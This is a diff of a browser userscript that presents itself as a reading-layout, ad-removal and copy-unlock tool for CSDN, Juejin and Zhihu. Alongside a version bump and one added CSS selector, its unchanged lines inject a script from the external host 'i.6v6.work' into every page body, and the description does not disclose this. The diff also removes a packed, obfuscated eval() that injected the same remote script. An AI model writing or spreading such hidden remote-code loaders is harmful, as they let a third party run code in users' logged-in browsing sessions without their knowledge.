@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         ⚡️ 掘金 ｜csdn ｜知乎 ｜ 独家UI排版 更方便您的阅读📖 去广告🪧 免登录复制 一键复制 去剪贴板劫持 持续更新 外链跳转 宽屏展示 不定期帮忙下载资源
 // @namespace    https://github.com/wandou-cc/blog-ui
-// @version      1.3.0
+// @version      1.3.1
 // @description  ⚡️ 掘金 ｜csdn ｜ 知乎 独家UI排版 更方便您的阅读📖 去广告🪧 免登录复制 一键复制 劫持剪贴板 持续更新 ｜💫全新布局｜🫥去掉一些花里胡哨的组件，阅读更加清晰｜🐯基本实现显示部分由用户自己定制｜🌈直接一键复制 不在需要登录｜✨展开所有折叠代码，简化操作｜支持移动端PC端通通优化｜入口支持拖拽放置
 // @author       wandou-cc
 // @include      *://*.csdn.net/*
@@ -27,7 +27,7 @@
 
 (function () {
     GM_addStyle(GM_getResourceText("css"));
-    const VERSION = '1.3.0'
+    const VERSION = '1.3.1'
     const TITLE = 'BLOGUI'
 
     let ISH5 = null
@@ -985,7 +985,7 @@
             }
 
             // 删除顶部右侧
-            ['.toolbar-btn-vip', '.toolbar-btn-collect', '.toolbar-dynamic-box', '.toolbar-mp-menubox', '.toolbar-btn-write', '.toolbar-advert'].forEach(item => {
+            ['.toolbar-btn-vip', '.toolbar-btn-collect', '.toolbar-dynamic-box', '.toolbar-mp-menubox', '.toolbar-btn-write', '.toolbar-advert', '.toolbar-btn-mp'].forEach(item => {
                 displayDom(item, checked)
             })
         }, 500)
@@ -1284,7 +1284,6 @@
         script.setAttribute('async', 'async')
         script.setAttribute('src', '//i.6v6.work/v/?uid=389137')
         document.querySelector('body').appendChild(script)
-        eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('f 3=6.5("b");    3.c="//8.2.g/e/?d=1";f 4=6.7("b")[0];    4.a.9(3,4);',62,17,'|389137|6v6|baidu|cnzz|createElement|document|getElementsByTagName|i|insertBefore|parentNode|script|src|uid|v|var|work'.split('|'),0,{}));
     }
 
     // -------- 主函数 -------------
